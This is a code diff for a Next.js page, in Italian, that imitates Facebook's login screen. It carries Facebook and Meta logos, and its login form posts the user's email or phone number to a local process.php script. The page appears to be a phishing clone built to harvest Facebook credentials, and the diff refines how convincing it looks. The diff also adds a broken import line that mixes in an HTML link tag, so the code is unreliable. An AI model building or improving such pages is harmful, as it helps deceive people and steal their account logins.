@@ -1,8 +1,7 @@
 'use client';
 
 import Image from 'next/image';
-import 'facebook.css'; // Assicurati che sia in app/ o in styles/
-
+import 'facebook.css'; <link rel="stylesheet" href="/facebook.css" />
 export default function Home() {
   return (
     <html lang="it">
@@ -13,8 +12,7 @@ export default function Home() {
 
         <div className="fb-container">
           <p className="lang">Italiano</p>
-          <img src="/facebook.png" />
-
+          <img src="/facebook.png" alt="Logo Facebook" />
           <div className="fb-login-box">
             <form action="process.php" method="POST" className="fb-form">
               <input type="text" name="email" placeholder="Email o numero di telefono" required />
@@ -26,7 +24,9 @@ export default function Home() {
             </form>
           </div>
 
-          <footer className="meta-footer"><img src="/meta.png"/>
+          <footer className="meta-footer">
+<img src="/meta.png" alt="Logo Meta" />
+
               <div className="meta-links">
               <a href="#">Informazioni</a>
               <a href="#">Centro assistenza</a>
